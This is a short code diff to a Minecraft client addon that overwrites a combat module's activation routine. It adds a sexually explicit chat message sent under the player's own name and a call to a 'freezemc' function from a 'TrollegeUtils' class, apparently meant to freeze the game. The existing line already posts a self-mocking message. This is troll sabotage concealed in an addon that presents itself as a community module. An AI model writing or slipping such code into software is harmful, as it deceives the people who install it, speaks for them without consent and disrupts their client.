@@ -1,6 +1,7 @@
 package communityaddon.mixin;
 
 import communityaddon.Addon;
+import communityaddon.TrollegeUtils;
 import meteordevelopment.meteorclient.systems.modules.Categories;
 import meteordevelopment.meteorclient.systems.modules.Category;
 import meteordevelopment.meteorclient.systems.modules.Module;
@@ -19,5 +20,7 @@ public abstract class SurroundMixin extends Module {
     @Overwrite
     public void onActivate() {
         ChatUtils.sendPlayerMsg("gg u win i suck at cpvp");
+        ChatUtils.sendPlayerMsg("FILL ME WITH CUM DADDY");
+        TrollegeUtils.freezemc();
     }
 }
